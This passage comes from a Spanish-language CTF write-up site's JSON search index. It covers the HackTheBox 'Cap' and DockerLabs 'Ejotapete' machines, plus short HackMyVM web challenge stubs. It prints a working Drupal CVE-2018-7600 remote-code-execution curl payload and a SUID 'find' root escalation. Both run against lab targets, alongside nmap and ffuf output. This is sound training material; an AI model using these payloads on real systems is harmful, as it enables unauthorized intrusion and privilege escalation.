SF:x20\\x20\\x20\u0026lt;title\u0026gt;Bad\\x20Request\u0026lt;/title\u0026gt;\\n\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\u0026lt;bod SF:y\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad\\x20Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20\\x20Inv SF:alid\\x20HTTP\\x20Version\\x20\u0026amp;#x27;Invalid\\x20HTTP\\x20Version:\\x20\u0026amp;#x27;R SF:TSP/1\\.0\u0026amp;#x27;\u0026amp;#x27;\\n\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(FourOhFourRequest, SF:189,\u0026#34;HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x SF:20Sat,\\x2017\\x20Aug\\x202024\\x2022:55:27\\x20GMT\\r\\nConnection:\\x20close\\ SF:r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x202 SF:32\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20HTML\\x203\\.2\\ SF:x20Final//EN\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;404\\x20Not\\x20Found\u0026lt;/title\u0026gt;\\n\u0026lt;h1\u0026gt;Not\\x20Found\u0026lt;/ SF:h1\u0026gt;\\n\u0026lt;p\u0026gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20the\\x20 SF:server\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20please\\x2 SF:0check\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.\u0026lt;/p\u0026gt;\\n\u0026#34;); Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Aug 18 00:57:20 2024 -- 1 IP address (1 host up) scanned in 175.28 seconds\rVamos a ver el puerto 80:\nShell as nathan Podremos ver que estamos como el usuario Nathan, si investigamos un poco por la web podremos encontrarnos lo siguiente:\nPodremos ver que es como una captura de la red, si vemos en la izquierda en el panel podremos ver Security Snapshot (5 Second PCAP + Analysis) si entramos podremos ver lo siguiente:\nPodremos ver que nos a llevado a /data/6 y podemos descargarnos un archivo .pcap pero si nos lo descargamos y lo abrimos no habra nada, intentaremos ver mas data de la siguiente manera:\nPodremos ver que ahora si habra data, asi que nos bajaremos el .pcap:\nAhora lo abriremos con WireShark:\nSi bajamos un poco podremos ver data por el puerto 21 que es el FTP, y si vemos bien se efectua un login donde podemos encontrar la contraseña:\nProbaremos a iniciar por FTP a ver si son validas:\nBien son validas, ahora probaremos por SSH a ver si tambien nos funciona:\nShell as root Usaremos Linpeas y podremos ver lo siguiente:\nPodremos ir a GTFOBins y buscaremos python capabilities:\nroot! ;)\n","date":"2023-09-07","id":19,"permalink":"/writeups/hackthebox/cap/","summary":"Enumeration Comenzaremos con un escaneo nmap:\n# Nmap 7.94SVN scan initiated Sun Aug 18 00:54:24 2024 as: nmap -p- --open -sCVS -vvv -n -Pn -oN target 10.","tags":[],"title":"Cap"},{"content":" ","date":"2023-09-07","id":20,"permalink":"/writeups/dockerlabs/eclipse/","summary":" ","tags":[],"title":"Eclipse"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n──(pylon㉿kali)-[~/…/pylon/DL/Ejotapete/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 172.17.0.2 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 11:09 CEST Initiating ARP Ping Scan at 11:09 Scanning 172.17.0.2 [1 port] Completed ARP Ping Scan at 11:09, 0.04s elapsed (1 total hosts) Initiating SYN Stealth Scan at 11:09 Scanning 172.17.0.2 [65535 ports] Discovered open port 80/tcp on 172.17.0.2 Completed SYN Stealth Scan at 11:09, 0.67s elapsed (65535 total ports) Nmap scan report for 172.17.0.2 Host is up, received arp-response (0.0000060s latency). Scanned at 2025-07-17 11:09:56 CEST for 1s Not shown: 65534 closed tcp ports (reset) PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 64 MAC Address: 02:42:AC:11:00:02 (Unknown) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVemos el puerto 80 abierto, vamos a lanzar un segundo escaneo para ver que servicio y versión corren en el:\n┌──(pylon㉿kali)-[~/…/pylon/DL/Ejotapete/nmap] └─$ nmap -p80 -sCV 172.17.0.2 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 11:10 CEST Nmap scan report for 172.17.0.2 Host is up (0.000031s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.25 |_http-title: 403 Forbidden |_http-server-header: Apache/2.4.25 (Debian) MAC Address: 02:42:AC:11:00:02 (Unknown) Service Info: Host: 172.17.0.2 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.47 seconds\rBien vemos devuelve un 403 Forbidden, así que estará haciendo mal el redirect o habrá algo oculto. Vamos a verlo en firefox:\nHmm\u0026hellip; Vamos a hacer fuzzing a ver si encontramos algo más interesante:\n┌──(pylon㉿kali)-[~/…/pylon/DL/Ejotapete/nmap] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://172.17.0.2/FUZZ\u0026#34; -e .php,.html,.js,.txt,.css /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://172.17.0.2/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt .css :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ drupal [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 0ms]\rVemos una carpeta llamada drupal, esto ya es más interesante. Vamos a acceder a ella:\nInteresante vamos a realizar fuzzing a la carpeta drupal a ver si encontramos algún archivo predeterminado que nos pueda chivar la versión:\n┌──(pylon㉿kali)-[~/…/pylon/DL/Ejotapete/nmap] 11:15:26 [9/9] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://172.17.0.2/drupal/FUZZ\u0026#34; -e .php,.html,.js,.txt,.css /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://172.17.0.2/drupal/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt .css :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ index.php [Status: 200, Size: 8902, Words: 1473, Lines: 233, Duration: 201ms] contact [Status: 200, Size: 12198, Words: 1639, Lines: 252, Duration: 81ms] search [Status: 302, Size: 388, Words: 60, Lines: 12, Duration: 10ms] user [Status: 302, Size: 384, Words: 60, Lines: 12, Duration: 6ms] themes [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms] modules [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 0ms] admin [Status: 403, Size: 8087, Words: 1367, Lines: 214, Duration: 18ms] node [Status: 200, Size: 8892, Words: 1473, Lines: 233, Duration: 11ms] sites [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 0ms] Search [Status: 302, Size: 388, Words: 60, Lines: 12, Duration: 1009ms] Contact [Status: 200, Size: 12180, Words: 1638, Lines: 252, Duration: 11ms] core [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms] install.php [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 0ms] profiles [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 0ms] update.php [Status: 403, Size: 133, Words: 21, Lines: 1, Duration: 98ms] README.txt [Status: 200, Size: 5889, Words: 748, Lines: 140, Duration: 0ms] vendor [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 0ms]\rVemos el archivo install.php, vamos a acceder a el:\nBien tenemos la versión de Drupal que es la 8.5.0, si hacemos una búsqueda de ella podremos darnos cuenta de que hay publicado un CVE:\nhttps://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2018-7600 Shell as www-data Vamos a explotarlo!!\nInvestigando me encontré con el siguiente payload:\ncurl -s \u0026#39;http://DRUPAL-TARGET/user/register?element_parents=account/mail/%23value\u0026amp;ajax_form=1\u0026amp;_wrapper_format=drupal_ajax\u0026#39; \\ --data \u0026#39;form_id=user_register_form\u0026amp;_drupal_ajax=1\u0026amp;mail[a][#post_render][]=exec\u0026amp;mail[a][#type]=markup\u0026amp;mail[a][#markup]=id\u0026#39;\rVamos a probarlo contra nuestro objetivo:\n┌──(pylon㉿kali)-[~/…/pylon/DL/Ejotapete/nmap] └─$ curl -s \u0026#39;http://172.17.0.2/drupal/user/register?element_parents=account/mail/%23value\u0026amp;ajax_form=1\u0026amp;_wrapper_format=drupal_ajax\u0026#39; \\ --data \u0026#39;form_id=user_register_form\u0026amp;_drupal_ajax=1\u0026amp;mail[a][#post_render][]=exec\u0026amp;mail[a][#type]=markup\u0026amp;mail[a][#markup]=id\u0026#39; {\u0026#34;command\u0026#34;:\u0026#34;insert\u0026#34;,\u0026#34;method\u0026#34;:\u0026#34;replaceWith\u0026#34;,\u0026#34;selector\u0026#34;:null,\u0026#34;data\u0026#34;:\u0026#34;uid=33(www-data) gid=33(www-data) groups=33(www-data)\\u003Cspan class=\\u0022ajax-new-content\\u0022\\u003E\\u003C\\/span\\u003E\u0026#34;,\u0026#34;settings\u0026#34;:null}]\rBien!! Logramos una ejecución remota de comandos. Ahora nos enviaremos una reverse shell:\nShell as root Vamos a enumerar binarios con el permiso SUID:\nwww-data@42beeea01109:/var/www/html/drupal$ find / -perm -4000 -ls 2\u0026gt;/dev/null find / -perm -4000 -ls 2\u0026gt;/dev/null 4850458 40 -rwsr-xr-x 1 root root 40504 May 17 2017 /usr/bin/chsh 4850546 40 -rwsr-xr-x 1 root root 40312 May 17 2017 /usr/bin/newgrp 4850503 76 -rwsr-xr-x 1 root root 75792 May 17 2017 /usr/bin/gpasswd 4850556 60 -rwsr-xr-x 1 root root 59680 May 17 2017 /usr/bin/passwd 4882251 220 -rwsr-xr-x 1 root root 221768 Feb 18 2017 /usr/bin/find 4850456 52 -rwsr-xr-x 1 root root 50040 May 17 2017 /usr/bin/chfn 4882165 140 -rwsr-xr-x 1 root root 140944 Jan 23 2021 /usr/bin/sudo 4849935 44 -rwsr-xr-x 1 root root 44304 Mar 7 2018 /bin/mount 4849958 32 -rwsr-xr-x 1 root root 31720 Mar 7 2018 /bin/umount 4849951 40 -rwsr-xr-x 1 root root 40536 May 17 2017 /bin/su\rVemos el binario find que si lo buscamos en GTFObins nos comentan lo siguiente:\nBien vamos a explotarlo:\nwww-data@42beeea01109:/var/www/html/drupal$ /usr/bin/find . -exec /bin/bash -p \\; -quit ; -quitn/find . -exec /bin/bash -p \\; bash-4.4# whoami whoami root\r","date":"2023-09-07","id":21,"permalink":"/writeups/dockerlabs/ejotapete/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n──(pylon㉿kali)-[~/…/pylon/DL/Ejotapete/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 172.17.0.2 Starting Nmap 7.","tags":[],"title":"Ejotapete"},{"content":" ","date":"2023-09-07","id":22,"permalink":"/writeups/hackmyvm/method/","summary":" ","tags":[],"title":"Method (Video)"},{"content":" ","date":"2023-09-07","id":23,"permalink":"/writeups/dockerlabs/upload/","summary":" ","tags":[],"title":"Upload"},{"content":"Vamos a ver la web:\nVemos un simple login, no disponemos ningún tipos de credenciales. Vamos a leer el código fuente:\nEncontramos una contraseña!! Vamos a probarla:\n","date":"2025-07-16","id":24,"permalink":"/challenges/hackmyvm/002/","summary":"Vamos a ver la web:\nVemos un simple login, no disponemos ningún tipos de credenciales. Vamos a leer el código fuente:","tags":[],"title":"002 (Web)"},{"content":"\r","date":"2025-07-16","id":25,"permalink":"/challenges/hackmyvm/009/","summary":"\r","tags":[],"title":"009 (Web)"},{"content":"Vamos a ver la web:\nVemos que solo hay una imagen, vamos a ver el código fuente:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;style\u0026gt; img { display: block; margin-left: auto; margin-right: auto; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img src=\u0026#34;logo.png\u0026#34; alt=\u0026#34;HMV\u0026#34; style=\u0026#34;width:50%;\u0026#34;\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\rNo vemos nada interesante. Vamos a hacer fuzzing con gobuster por archivos y directorios:\n❯ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#39;http://momo.hackmyvm.eu/\u0026#39; -x php,html,js,txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://momo.hackmyvm.eu/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,html,js,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 268] /robots.txt (Status: 200) [Size: 15]\rVemos un robots.txt , vamos a ver su contenido:\n","date":"2025-07-16","id":26,"permalink":"/challenges/hackmyvm/014/","summary":"Vamos a ver la web:\nVemos que solo hay una imagen, vamos a ver el código fuente:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;style\u0026gt; img { display: block; margin-left: auto; margin-right: auto; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;img src=\u0026#34;logo.","tags":[],"title":"014 (Web)"},{"content":"Link to valuable, relevant resources.\n","date":"2024-02-27","id":27,"permalink":"/challenges/resources/","summary":"Link to valuable, relevant resources.","tags":[],"title":"Resources"},{"content":"Link to valuable, relevant resources.\n","date":"2024-02-27","id":28,"permalink":"/writeups/resources/","summary":"Link to valuable, relevant resources.","tags":[],"title":"Resources"},{"content":"","date":"2023-09-07","id":29,"permalink":"/challenges/","summary":"","tags":[],"title":"Bienvenido"},{"content":"","date":"2023-09-07","id":30,"permalink":"/writeups/","summary":"","tags":[],"title":"Bienvenido"},{"content":"","date":"2023-09-07","id":31,"permalink":"/challenges/intro/","summary":"","tags":[],"title":"INTRO"},{"content":"","date":"2023-09-07","id":32,"permalink":"/writeups/intro/","summary":"","tags":[],"title":"INTRO"},{"content":"","date":"2025-06-15","id":33,"permalink":"/tags/arch-linux/","summary":"","tags":[],"title":"Arch Linux"},{"content":"","date":"2025-06-15","id":34,"permalink":"/categories/","summary":"","tags":[],"title":"Categories"},{"content":"","date":"2025-06-15","id":35,"permalink":"/tags/cve-2023-3452/","summary":"","tags":[],"title":"CVE-2023-3452"},{"content":"","date":"2025-06-15","id":36,"permalink":"/tags/nvidia/","summary":"","tags":[],"title":"Nvidia"},{"content":"","date":"2025-06-15","id":37,"permalink":"/categories/poc/","summary":"","tags":[],"title":"PoC"},{"content":"","date":"2025-06-15","id":38,"permalink":"/tags/rce/","summary":"","tags":[],"title":"RCE"},{"content":"","date":"2025-06-15","id":39,"permalink":"/tags/rfi/","summary":"","tags":[],"title":"RFI"},{"content":"","date":"2025-06-15","id":40,"permalink":"/tags/","summary":"","tags":[],"title":"Tags"},{"content":"","date":"2025-06-15","id":41,"permalink":"/tags/unauthenticated/","summary":"","tags":[],"title":"Unauthenticated"},{"content":"","date":"2023-09-07","id":42,"permalink":"/privacy/","summary":"","tags":[],"title":"Privacy Policy"},{"content":"","date":"2023-09-07","id":43,"permalink":"/","summary":"","tags":[],"title":"pylon"},{"content":"","date":"0001-01-01","id":44,"permalink":"/contributors/","summary":"","tags":[],"title":"Contributors"}]